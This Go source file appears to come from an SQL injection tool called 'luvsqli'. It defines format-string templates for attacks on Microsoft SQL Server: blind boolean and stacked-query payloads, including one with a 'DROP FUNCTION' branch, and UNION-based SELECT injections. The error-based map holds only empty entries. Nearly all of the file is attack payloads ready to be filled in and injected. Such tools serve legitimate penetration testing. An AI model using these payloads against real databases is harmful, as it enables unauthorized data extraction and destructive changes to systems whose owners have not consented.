package luvsqli

//MsSqlBlind is a map of MsSql Blind SQLi attack vectors
var MsSqlBlind = map[string]string{
	"bool_rep":   "(SELECT (CASE WHEN (%s) THEN 1 ELSE 1*(SELECT 1 UNION ALL SELECT 3655) END))",
	"if_stacked": "%s;IF(%s) SELECT 2380 ELSE DROP FUNCTION nafo%s",
	"stacked":    "%s;SELECT (CASE WHEN (%s) THEN 1 ELSE 1154*(SELECT 2996 UNION ALL SELECT 9923) END)%s",
}

//MsSqlError is a map of MsSql Error SQLi attack vectors
var MsSqlError = map[string]string{
	"in":            "",
	"convert":       "",
	"concat":        "",
	"param_rep":     "",
	"param_rep_int": "",
}

//MsSqlUnion is a map of MsSql Union SQLi attack vectors
var MsSqlUnion = map[string]string{
	"single": "%s UNION SELECT %s %s",
	"all":    "%s UNION ALL SELECT %s %s",
}
